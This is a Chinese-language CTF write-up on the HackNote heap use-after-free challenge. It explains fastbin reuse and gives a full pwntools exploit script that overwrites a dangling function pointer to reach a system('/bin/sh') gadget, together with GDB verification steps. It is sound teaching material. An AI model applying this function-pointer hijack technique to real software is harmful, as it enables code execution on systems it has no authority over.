第四次 `add(0x8, payload)` 会先申请新 `Note`，再申请新内容：

```text
第四次 add 实际使用 slot 3：
  N3 = malloc(0x8)  → 取走 N2
  C3 = malloc(0x8)  → 取走 N1
```

它是 slot `3`，不是 slot `1` 或 `2`：`del_note` 没有把 `notelist[1]`、`notelist[2]` 写成 NULL，`add_note` 扫描空槽时会继续找到 `notelist[3]`。不过，`C3` 的**地址数值**会复用旧 `N1`，这才是利用所需的重叠。

```text
旧的解释：N1 + 0x0 = print_func
新的解释：C3 + 0x0 = 你的 payload 第 1~4 字节

C3 == N1
payload = p32(magic)
        = 45 89 04 08   # little-endian，数值是 0x08048945
```

最后 `print(1)` 没有使用第四条笔记；它仍沿悬空的 `notelist[1]` 找到旧 `N1`。`print_note` 读取 `N1+0`，得到 `0x08048945`，并在 `call eax` 跳入 `magic`。

```text
notelist[1] ──► N1 / C3
                 +0x00: 0x08048945  ──► magic → system("/bin/sh")
                 +0x04: 原 N1 的第二字段位置，已不再是可信 Note 字段
```

#### 6.2 两条 add 的替代布局：为什么最后打印旧索引 0

如果希望一开始只建两条笔记，也可以把**内容请求大小**与 8 字节 Note 分到不同 chunk 类别。以下是依据静态分析与 glibc 2.23/i386 `request2size` 公式推导的候选流程，尚未在 VM 中动态验证：

```text
add(16, A*16)  → slot 0：N0 请求 8（chunk 0x10），C0 请求 16（chunk 0x18）
add(16, B*16)  → slot 1：N1 请求 8（chunk 0x10），C1 请求 16（chunk 0x18）
delete(0)      → 先 free C0，再 free N0
delete(1)      → 先 free C1，再 free N1
add(8, payload)→ 新 Note 先取 N1；新 content 再取 N0
print(0)       → 旧 slot 0 仍保存 N0，首字段现在由 payload 覆盖
```

关键不是“只有两条也能做”，而是每个新 `add` 都先申请 Note 再申请 content，且两类对象必须进不同大小类。`malloc(16)` 的 16 是**十进制请求字节数**，在此 i386 glibc 2.23 配置下对应 `0x18` chunk；结构体的 `malloc(8)` 对应 `0x10` chunk。释放两条后，小类链表应为 `N1 → N0`，新 Note 取走 N1 后，新 content 才取 N0。此候选流程需要以 GDB 地址相等关系验证，不能只按图认定成功。

这个两条笔记布局与上面的原脚本不同：原脚本使用三条笔记、`delete(1)`/`delete(2)`，再打印旧索引 1；两条笔记方案则删除 0/1，最后打印旧索引 0。新建出来的那条笔记会写入下一个空槽（通常是 slot 2），不会自动覆盖已残留悬空地址的 slot 0/1。

#### 手工输入时的十进制、十六进制与 chunk 大小

HackNote 的大小提示由 `atoi` 解析，键盘输入 `18` 表示**十进制 18**，不等于 pwntools 脚本里的 `0x18`（十进制 24）。在常见 i386 glibc 2.23 参数下，用 `SIZE_SZ=4`、8 字节对齐和 `request2size(req)=round_up(req+4,8)` 计算：

| 输入/脚本表达式 | 传给 `malloc` 的请求 | 典型 chunk size |
|---|---:|---:|
| 菜单输入 `8` 或 `add(8, ...)` | 8（`0x8`） | `0x10` |
| 菜单输入 `16` 或 `add(16, ...)` | 16（`0x10`） | `0x18` |
| 菜单输入 `18` | 18（`0x12`） | `0x18` |
| Python `add(0x18, ...)` | 24（`0x18`） | `0x20` |

所以用户终端记录里的 `Note size :18` 若确实按原样输入，是请求 18 字节、典型 chunk `0x18`；原脚本中的 `add(0x18, ...)` 则请求 24 字节、典型 chunk `0x20`。两者都和 8 字节 Note 的 `0x10` 类不同，能把 C2 隔离出小类链，但它们**不是相同请求或相同 chunk 大小**。换 libc/架构时重新核实公式和实际 header。此换算可对照 [glibc 2.23 `malloc.c` 的 `request2size` 宏](https://chromium.googlesource.com/native_client/nacl-glibc/%2B/glibc-2.23/malloc/malloc.c)。

#### 这条利用链依赖什么，哪些保护不挡它

这不是栈溢出，也不是 ROP。程序已有一条可达的间接调用，漏洞让这条调用从堆对象偏移 `+0` 读取被输入改写的函数地址：

```text
旧引用仍可用 → 新 content 复用旧 Note 地址 → 输入改写 +0 字段
             → print(1) 读出 magic → 间接 call → magic 调 system("/bin/sh")
```

| 条件 / 保护 | 对这份脚本的影响 |
|---|---|
| i386 与小端 | `Note *`、函数地址均为 4 字节；`p32(magic)` 产生低位在前的 4 字节。换成 amd64 后，结构大小、参数传递和打包宽度都要重算。 |
| 非 PIE | `magic=0x08048945` 是附件内固定代码地址，可以直接打包。若目标启用 PIE，通常要先取得程序基址，再计算 `magic` 的运行地址。 |
| NX | 这条链跳到 ELF 已有的 `magic` 代码，没有把堆上输入当机器码执行；因此 NX 不阻止这次跳转。 |
| Canary | 利用没有覆盖栈上的保存返回地址，所以 Canary 不是这条链的关键门槛。 |
| RELRO | 脚本没有改 GOT；Partial/Full RELRO 不直接阻断这条堆对象函数指针路径。 |
| glibc 与分配顺序 | 必须让新 `Note` 和新 content 按预期取到旧 chunk。该脚本按本地 i386 glibc 2.23 的 fastbin 模型推演；带 tcache 或不同初态时，地址次序可能变。 |
| `print` 的可达性 | 释放后旧槽位必须仍可通过索引访问，而且打印路径必须真的执行 `call eax`。只有“存在 UAF”还不够。 |

因此，`checksec` 不是自动选 exploit 的答案。这里最关键的是**非 PIE 固定目标地址、旧槽可达、函数指针可控、分配器复用顺序成立**；NX、Canary、RELRO 虽然仍要记录，但不是这条链的控制点。

#### `call eax` 时栈上有什么

`print_note` 在调用前执行 `push edx`，所以它把旧 `Note *` 作为第一个实参压栈。CPU 执行 `call eax` 时，还会把下一条指令地址压入栈顶并跳到 `$eax`：

```text
call eax 执行前（低地址在上）       magic 函数入口
┌────────────────────┐             ┌────────────────────────┐
│ [esp] = N1          │  push edx   │ [esp]   = 返回地址      │
│ 后面是预留栈空间     │ ──────────→ │ [esp+4] = N1（第1实参） │
│                    │  call eax   │ [esp+8] = 预留区         │
└────────────────────┘             └────────────────────────┘
                                       EIP = magic
```

断在 call 指令之前时，第一个实参在 `$esp`；若断在目标函数入口，CPU 已经压入返回地址，第一个实参在 `$esp+4`。本附件的 `magic` 不读取这个 `Note *`，而是直接把固定字符串交给 `system`，所以这个额外实参没有改变它的行为。机器层面这次调用能继续执行，不代表用不兼容的 C 函数指针类型调用在 C 语言层面是定义良好的；换一个目标函数时，必须重新核对它如何取参、是否清栈和返回路径。

### 6.2 修正后的本地脚本

你的原脚本的利用顺序与这份附件的静态结构吻合，但 `context(arch='amd64')` 与 i386 ELF 不一致。它仍可能工作，是因为手工用了 `p32(magic)`；pwntools 的 `ELF` 对象和 context 不一致，之后用 `flat`、寄存器名、cyclic 或 shellcraft 时会出错。下面从脚本所在目录找到配套的 i386 loader 和 libc，而不是依赖 VM 的默认 libc。

```python
from pwn import *
from pathlib import Path
from shutil import copy2

binary = Path(__file__).resolve().with_name("hacknote")
elf = context.binary = ELF(str(binary), checksec=False)
context.log_level = "debug"

# 本脚本按题库目录结构放置：i386/challenges/heap/UAF/hacknote.py。
# 必须在 Linux VM 中运行；若附件被移到别处，按 VM 实际路径调整。
i386_root = Path(__file__).resolve().parents[3]

# VM 实测发现题库顶层 loader/libc 别名会形成符号链接循环。
# 使用 lib/ 下的实体文件，复制到 VM 本地目录；libc 需命名为 libc.so.6。
runtime = Path("/tmp/hacknotevm")
runtime.mkdir(parents=True, exist_ok=True)
loader = runtime / "ld-2.23.so"
libc = runtime / "libc.so.6"
local_binary = runtime / "hacknote"
copy2(i386_root / "lib" / "ld-2.23.so", loader)
copy2(i386_root / "lib" / "libc-2.23.so", libc)
copy2(binary, local_binary)

io = process([str(loader), "--library-path", str(runtime), str(local_binary)])

def choose(n):
    io.sendlineafter(b"Your choice :", str(n).encode())

def add(size, content):
    choose(1)
    io.sendlineafter(b"Note size :", str(size).encode())
    # content 对应原始 read；保留二进制字节，且补足本次请求长度。
    if len(content) > size:
        raise ValueError("content 长度不能超过申请大小")
    io.sendafter(b"Content :", content.ljust(size, b"\x00"))

def delete(index):
    choose(2)
    io.sendlineafter(b"Index :", str(index).encode())

def show(index):
    choose(3)
    io.sendlineafter(b"Index :", str(index).encode())

add(0x8,  b"A")
add(0x8,  b"B")
add(0x18, b"C")

delete(1)
delete(2)

add(0x8, p32(elf.sym.magic))
show(1)
io.interactive()
```

`parents[3]` 是这份目录树里的 `i386/` 根目录。题库现存的旧 `hacknote.py` 对父目录层级的计算有误，不能直接照抄；如果你调整过目录，先用 `print(i386_root)` 看它实际指向哪里。

原脚本把显示辅助函数命名为 `print(index)`，会遮住 Python 内置的 `print()`；修正版用 `show(index)`，避免之后调试时想打印地址却调用到题目交互函数。

> [!warning] 本地运行库与远程运行库
> 这段 `process([...])` 明确让本地程序使用题库中的 glibc 2.23 候选，便于验证 fastbin 时间线；这不证明远程服务也是 glibc 2.23。远程连接代码里的主机名、端口、TLS/SNI 和题目当前状态也需要独立确认。本文实验只以本地附件为对象。

原脚本对菜单、大小和索引都只调用 `send()` 发送数字，没有换行。静态反汇编能确认，`add_note` 在 `0x080486f3` 用 `read(0, [ebp-0x18], 8)` 读大小，随后在 `0x08048702` 把同一缓冲区交给 `atoi()`；两者之间没有显式清零或写入 NUL。只发数字时，`read` 返回后数字串后面是什么取决于栈上原有字节，`atoi` 可能继续读到缓冲区外才遇到非数字/NUL。修正版用 `sendlineafter` 把换行作为明确的停止字符。这说明原写法脆弱，不代表它在每次运行中必然失败。`ljust` 则让发送端提交与申请大小相同的内容字节；但 `read(fd, buf, size)` 允许短读，不能仅凭 `ljust` 保证一次 `read` 消耗完整内容。若出现交互错位，在 `0x0804878a`（内容 `read` 返回后）检查 EAX 的实际返回字节数，并对照下一个提示符。

---

## 7. 本地 GDB 实验：逐步复现这份脚本

这节严格按脚本的 `add(0), add(1), add(2), delete(1), delete(2), add(3), print(1)` 记录。地址取自本地非 PIE 附件的静态反汇编；fastbin 顺序是 i386 glibc 2.23 的预期，只有记录到真实返回地址后才算动态证实。

先在 Linux VM 的题目目录里确认自己正在分析正确的 32 位附件和运行库：

```bash
file ./hacknote
checksec --file=./hacknote
readelf -lW ./hacknote
readelf -dW ./hacknote
```

这里 `file` 回答架构，`readelf -lW` 看解释器与装载段，`readelf -dW` 看动态依赖；这些只确认文件声明。跑到 GDB 后还要用 `info sharedlibrary` 和 `info proc mappings` 看实际映射的 loader/libc。当前脚本明确通过 i386 运行树的 loader 启动目标，不能只看 VM 自带的 `ldd` 结果就把 libc 版本记成已证实。

### 7.1 启动 GDB 并设断点

在修正后的 pwntools 脚本中，紧跟 `io = process(...)` 加入可选调试段：

```python
if args.GDB:
    gdb.attach(io, gdbscript="""
        set disassembly-flavor intel
        b *0x08048685
        b *0x080486d6
        b *0x08048725
        b *0x0804875a
        b *0x0804878a
        b *0x0804885e
        b *0x08048876
        b *0x0804893a
        continue
    """)
```

在 Linux VM 的终端里运行 `python3 hacknote.py GDB`。`gdb.attach` 需要 pwntools 能打开的终端；若 VM 没有默认终端后端，先把 `context.terminal` 配成 VM 已安装的终端，或在 tmux 会话中运行。断点的含义如下：

| 地址 | 停止时机 | 此刻看什么 |
|---|---|---|
| `0x08048685` | `malloc(8)` 返回之后 | `$eax` 是新 `Note` 用户区地址 |
| `0x080486d6` | `Note` 的打印函数字段已写入之后 | 全局槽已保存 Note 地址；第二字段尚未由本次添加初始化 |
| `0x08048725` | `malloc(size)` 返回之后 | `$eax` 是新 content 用户区地址 |
| `0x0804875a` | content 指针已写入 `Note+4` 且通过非空检查之后 | 可从 `Note+4` 取 content 地址；内容 `read` 尚未执行 |
| `0x0804878a` | 内容 `read` 已返回、`add esp,0x10` 尚未执行 | `$eax` 仍是本次 `read` 的返回字节数 |
| `0x0804885e` | 调用 `free(content)` 之前 | `$esp` 顶部是即将传给 `free` 的参数 |
| `0x08048876` | 调用 `free(Note)` 之前 | `$esp` 顶部是即将传给 `free` 的参数 |
| `0x0804893a` | 间接 `call eax` 之前 | `$eax` 是目标函数；`$edx` 是传入的 `Note *` |

这里断在 `call free` **指令本身之前**，所以先看 `x/wx $esp`。若你另行在 `free` 函数入口设断点，CPU 已经压入返回地址，参数才位于 `$esp+4`；不要把这两种断点位置混用。

### 从全局槽逐层追到 Note 与 content

这些地址只对应本地这份 i386 非 PIE 附件。先在 `0x080486d6` 停住：`notelist[0]` 已写入 Note 地址，Note 的第一个字段已初始化；第二个字段此刻不可当作有效 content 指针。

```gdb
x/5wx 0x0804a048
set $slot0 = 0x0804a048
set $note0 = *(unsigned int *)$slot0
p/x $note0
x/2wx $note0
x/i *(unsigned int *)$note0
```

`0x0804a048` 是全局数组第 0 个槽的位置；从该槽读出的 4 字节才是 Note 地址；`x/2wx $note0` 查看 Note 的两个 4 字节字段。第一项应为打印函数地址；第二项是尚未初始化的原始值，不要预期为 0，也不要解引用。

继续到 `0x0804875a`，第二次 `malloc(size)` 的返回值已经写入 `Note+4`，并通过空指针检查：

```gdb
set $content0 = *(unsigned int *)($note0 + 4)
p/x $content0
```

此时 `$content0` 才是本次 content 用户区地址。继续到 `0x0804878a`，内容 `read` 已返回：

```gdb
p/d $eax
x/8bx $content0
```

`$eax` 是这一次 `read` 实际返回的字节数，不保证等于请求长度。若在终端输入 `HELLO` 并回车，常见现象是前 6 个字节为 `48 45 4c 4c 4f 0a`；剩余字节不能预设，`read` 不会自动补 `\0`。这只是原始字节观察，不代表缓冲区一定是 NUL 终止字符串。

即使 GDB 显示没有完整源码调试信息，也可以用符号断点或已核实的地址断点。断在某地址时，该地址所指指令尚未执行；例如停在 `0x080486d6` 时，前一条 `mov [eax], edx` 已执行完。若没有源码行信息，不要假设 `next` 能逐源码行停下；按反汇编用 `ni` 或设置下一个地址断点。

### 7.2 按原脚本顺序记录地址

每次命中 malloc 返回断点时，用 `$eax` 保存地址数值。下面变量名是 GDB convenience variable，必须在对应那次命中时设置：

```gdb
# 第 1 次 add：malloc(8) Note 返回点
set $n0 = $eax
# 同一次 add 随后的 malloc(8) content 返回点
set $c0 = $eax

# 第 2 次 add 的两个返回点
set $n1 = $eax
set $c1 = $eax

# 第 3 次 add 的两个返回点
set $n2 = $eax
set $c2 = $eax
```

不要一次性粘贴这些行；每行要在对应断点停住时单独执行，否则它们只会重复保存当前 `$eax`。每个返回点都可以用下列命令确认地址和 chunk header：

```gdb
p/x $eax
x/2wx (char *)$eax - 8
x/5wx 0x0804a048
```

在 i386 glibc 2.23 候选中，header 大小通常为 8 字节；`$eax-4` 的 raw size 常见为 `0x11` 或 `0x21`，最低位表示 `PREV_INUSE` 等标志，实际值要以现场为准。

命中两个 free 调用点时，按脚本索引确认释放的是 `C1 → N1`、然后 `C2 → N2`：

```gdb
x/wx $esp                  # call free 前的第一个参数
```

先保存/抄下每个参数，并与 `$c1/$n1/$c2/$n2` 比较。若要看 `N1` 的字段，只在它释放前执行 `x/2wx $n1`；释放后该地址属于 allocator，不能再把内容当作有效 `Note` 字段解释。

### 7.3 对照 fastbin 预测与新对象返回地址

glibc 2.23/i386 的预期时间线如下；箭头按“用户区地址”画，便于与 `$eax` 比较：

```text
delete(1)：0x10 fastbin  N1 → C1
delete(2)：0x20 fastbin  C2
           0x10 fastbin  N2 → N1 → C1

第 4 次 add：N3 返回地址应等于 N2
             C3 返回地址应等于 N1
```

注意：fastbin chunk 里的 `fd` 实际保存的是**下一个 chunk header 地址**。在 i386 的常见布局里，header 地址比对应用户区指针小 8；因此 Pwndbg `bins` 输出的指针与本页用 `N1/C1` 表示的用户指针看起来可能差 `8`。比较前先确认工具显示的是 chunk header 还是用户区地址。

按实际命中顺序，在第 4 次 `add(0x8, ...)` 的两个返回点检查：

```gdb
# 第 4 次 malloc(8) 返回：新 Note，记为 $n3
p/x $eax
set $n3 = $eax

# 紧随其后的 malloc(8) 返回：新 content，记为 $c3
p/x $eax
set $c3 = $eax
```

若 `$n3 == $n2` 且 `$c3 == $n1`，并且输入 marker 出现在 `$c3` 起始位置，地址复用才算证实。运行到 `print(1)` 的间接调用点后，检查：

```gdb
info registers eax edx esp eip
x/2wx $edx
x/i $eax
```

预期 `$edx == $n1`，`*(unsigned int *)$edx == 0x08048945`，`$eax == 0x08048945`。再单步一次：

```gdb
si
info registers eip
```

若 `$eip == 0x08048945`，间接调用目标已由动态现场证实。到这里才记录“本地复现成功”；若任一地址不同，先检查实际 loader/libc、分配顺序、输入是否完整和 fastbin 状态，不要硬套预测。

### 7.4 这份脚本的现场记录表

把地址写成 8 位十六进制；删除时记录 free 参数，新增时记录 malloc 返回值：

| 操作 | Note 地址 | content 地址 | free 参数 / 与旧地址比较 | 现场结论 |
|---|---:|---:|---|---|
| `add(0x8, b'aaa')` → slot 0 | `$n0 =` | `$c0 =` | — | 基线 |
| `add(0x8, b'aaa')` → slot 1 | `$n1 =` | `$c1 =` | — | 基线 |
| `add(0x18, b'aaa')` → slot 2 | `$n2 =` | `$c2 =` | — | `C2` 应为 `0x20` 类别 |
| `delete(1)` | — | — | 依次 `C1`、`N1` | 两个对象释放，slot 1 未清 |
| `delete(2)` | — | — | 依次 `C2`、`N2` | 两个对象释放，slot 2 未清 |
| 第 4 次 `add(0x8, payload)` → slot 3 | `$n3 =` | `$c3 =` | 比较 `$n3==$n2`、`$c3==$n1` | 复用须由相等地址证明 |
| `print(1)` | `$edx =` | — | `$eax =` | call 前目标应为 `magic` |

如果 Pwndbg 可用，可在 delete 完成后查看 `bins`；没有插件时，不要为了得到漂亮输出而假设命令存在，记录 free 参数、返回地址与 header raw size 已足以验证本题链条。

### 7.5 结果不符合预测时，从哪一层排查

| 现场现象 | 先查什么 | 下一步怎么判断 |
|---|---|---|
| 第 4 次分配的 `$n3` 不等于 `$n2` | `info sharedlibrary`、`info proc mappings`、每次 `free` 的参数 | 先确认运行时确实是目标 i386 glibc 2.23 候选，再确认 `N2` 是否真的进入 `0x10` fastbin，以及两次删除顺序是否与脚本一致 |
| `$n3==$n2`，但 `$c3!=$n1` | `0x10` 类 fastbin 状态、`$c2` 的 header raw size | 检查 `malloc(0x18)` 是否确实进入 `0x20` 类别；若 C2 进了 `0x10` 链，后续取块顺序会变化 |
| `$c3==$n1`，但旧地址首 word 不是 magic | 在 `0x0804878a` 看 `read` 返回的字节数；执行 `x/8bx $c3` | 确认输入是否到达 content 起点、前四字节是否为 `45 89 04 08`；`p32` 是小端 32 位打包 |
| `print(1)` 前 `$edx!=$n1` | `x/5wx 0x0804a048` 与当前索引 | 先确认调用的是 slot 1；检查 `notelist[1]` 是否仍保存旧 N1 数值 |
| `$edx==$n1`，但 `$eax` 不是 `0x08048945` | `x/wx $edx` 和 `x/4bx $edx` | 查看旧 Note 的函数指针字段被写成了什么；区分地址复用失败、输入未覆盖与 print 路径变化 |
| 单步后 `$eip` 已是 `magic`，但没看到 shell | 看 `magic` 内是否走到 `system@plt`，再看 pwntools 的 `io.interactive()` 和子进程 I/O | 控制流跳转已证实；shell 交互问题与堆复用问题分开排查 |

每次只记录眼前事实。例如 `$c3==$n1` 只能证明地址复用，不能单独证明前四字节可控；`$eax==magic` 证明 call 目标值正确，单步后 `$eip==magic` 才证明 CPU 已跳转。

### 7.6 用户提交的 VM 手工输入记录：先解释输入错位，再定位崩溃

2026-10-25 的终端记录显示：程序从题库目录启动并进入菜单；两次都按 `add(8), add(8), add(18), delete(1), delete(2), add(8), print(1)` 操作，最后在打印时段错误。两次新增都在 `add` 后出现 `Invalid choice`。这是**用户提供的运行记录**，没有配套 GDB 寄存器、malloc 返回地址、实际加载库映射或 ELF Build ID；它证明该次手工流程运行到了崩溃，不证明复用链或崩溃根因。

记录中的两个问题应拆开看：

1. **`Invalid choice`：输入长度很可能没有与 `read` 对齐。** 若 Content 的请求长度为 8，键入 `AB 89 04 08` 一共有 11 个 ASCII 字符；`read(..., 8)` 最多取前 8 个，行尾剩余字符可能被下一轮菜单读走。键入 `ab890408` 正好 8 个字符，但在终端按回车还会产生换行；若内容 `read` 只取 8 字节，换行仍可能留给菜单。此机制与记录吻合，但菜单 `read` 到底如何消费残留字节，仍应在对应菜单读取处单步确认。
2. **段错误：屏幕记录不足以断言唯一原因。** `ab890408` 是 8 个 ASCII 字节 `61 62 38 39 30 34 30 38`，不是四个十六进制原始字节；若它确实覆盖了旧 Note 首字段，前四字节按小端解释为 `0x39386261`，通常不是有效函数地址。`AB 89 04 08` 同样是文本；前四个实际字符是 `41 42 20 38`，不是字节 `AB 89 04 08`。此外，本地静态审查的同一附件中 `magic=0x08048945`，正确的 4 字节小端表示为 `45 89 04 08`；输入里写的 `AB 89 04 08` 若被当作十六进制字节，则表示另一个地址 `0x080489AB`。VM 中的文件仍应先用 hash/符号检查确认与该附件相同。

只用 `print(1)` 本身没有问题：`index` 是 `notelist[]` 的数组下标，0/1/2 都是常见的非负槽号；`1` 指第二个槽，不是堆偏移，也不需要输入负数。原三条笔记路线的目标是旧 `notelist[1]`；两条笔记变式的目标是旧 `notelist[0]`，应按自己实际分配/删除的槽位选择。

#### 在 VM 里把失败定位到具体一层

先确认程序身份与符号，不要把纸面地址直接当作 VM 事实：

```bash
sha256sum ./hacknote
file ./hacknote
readelf -n ./hacknote | grep -i 'Build ID'
nm -n ./hacknote | grep -E ' magic$'
```

对本地静态审查过的那份附件，已知 SHA-256 为 `f6f7788a740fa19e436e155c9e4ea9835010a636dcb97fef64ecdcfa41f7d93e`、`magic=0x08048945`。只有文件身份吻合时，才把它用于当前 VM 的对照。

在原始 `read` 返回位置和间接调用处分别观察：

```gdb
b *0x0804878a
b *0x0804893a
run
# 每次停在内容 read 返回后：
p/d $eax
# 仅在第 4 次 add 的内容 read 返回后，且已在 malloc 返回点保存 $c3 时：
x/8bx $c3
# 停在 print 的 call eax 前：
info registers eax edx eip esp
x/8bx $edx
x/i $eax
```

`0x0804878a` 仅适用于 Build ID 匹配的非 PIE 附件；`$c3` 必须先在第三次内容分配返回时保存为实际 content 用户地址。间接调用断点的判别是：`$edx` 应等于释放前记录的旧 Note 地址，`$eax` 应等于确认过的 `magic` 地址；若收到了 SIGSEGV，再看 `info registers eip`、`x/i $eip`、`bt`，判断是跳向坏函数指针、对象地址没复用，还是更早的菜单/输入错位。不要仅凭“崩了”就下结论。

手工终端不适合键入不可见的原始地址字节。复现应使用脚本的 `p32(elf.sym.magic)` 生成 4 字节 payload，并由 `sendafter` 原样发送；菜单、大小、索引再用 `sendlineafter`。如果继续手动操作，使用十六进制查看器确认真正进入 content 的字节，并留意 `read` 请求长度与 TTY 换行。

## 8. 本题最容易混淆的五件事

| 容易说错的话 | 更准确的说法 |
|---|---|
| `free` 会把指针清空 | `free` 不会替程序写回保存该地址的数组槽位；程序必须自己置空 |
| `malloc(8)` 就是一块 8 字节 chunk | 是 8 字节用户请求；chunk 总大小取决于目标 ABI 与 allocator 的对齐/头部规则 |
| 删除后显示旧字节，说明对象还活着 | 只说明该地址的映射/字节暂未被覆盖；对象生命周期已经结束 |
| 小块一定按我画的顺序复用 | LIFO、bin 和检查由目标 libc、大小类别、cache 状态决定，必须实际记录 |
| 改了函数指针就是成功 | 还要证明调用路径可达、字段位置正确、调用目标可执行且 ABI 可接受 |

特别是 `atoi(buf)` 一类伪代码：如果输入缓冲区刚好读满且没有 NUL 终止，具体的解析行为还取决于初始化和周围内存。没有源码/汇编和输入轨迹，不能把它当作已经坐实的第二个漏洞。

---

## 9. 复盘卡与迁移练习

完成上面的 GDB 表后，用自己的话回答：

1. `notelist[0]`、`N0`、`C0` 各自是什么？它们在内存里的关系是什么？
2. 为什么一条笔记需要两次 `malloc`？哪一块含函数指针？
3. 这份脚本 `delete(1)` 后，哪两个对象生命周期结束？哪一个全局引用仍留着？
4. `print(1)` 在 CPU 层面先读了哪个偏移，再执行了什么指令？
5. 你如何区分“猜测会复用”与“已经用地址、marker、调用点证实复用”？

48 小时迁移题：把 `Note` 改成只有一个 `char *content` 字段，或者让 `print` 改为 `puts(n->content)`；重新回答“此时 UAF 能力是 read、write 还是 call 候选，为什么”。这样可以检验你学到的是对象模型，而不是 HackNote 的操作顺序。

---

## 10. 掌握证据与下一步

- **当前：静态链条已核验，个人掌握仍待测。** 读到本页、拿到现成脚本或看到静态反汇编，都不构成你的掌握等级证据。
- **可记为 L2 的证据：** 不看本页，画出 `notelist → N0 → C0`，并解释一次 `delete → add → print` 的含义。
- **可记为 L3 的证据：** 在自己的 i386 题目环境留下上述 GDB 地址表、`print` 前的寄存器/内存快照、实际加载 libc 的 mapping 和一段最小 Research Log；不要求连接远程服务。

下一页应回到 `UAF详解#原理`，把本题写成“哪一类 UAF、证据是什么、能力边界在哪里”，而不是把它记成一串固定菜单顺序。

## 相关代码与实战模板

- 题目专属、待 VM 验证的脚本：`HackNote 本地复现实例`。
- 本页模板入口：`malloc/free 生命周期实验` · `GDB 观察模板` · `HackNote 本地复现实例` · `pwntools EXP 启动骨架`。
- 全局选择：`选择指南`；完整逐篇清单：`逐篇映射表`。
- 相关题目/WP：本页即题解；`全部题解索引`。
- 本页已有代码片段是教学/题解材料；除非验证报告明确记录对应目标和验收结果，不应视为可运行模板或 exploit 成功。
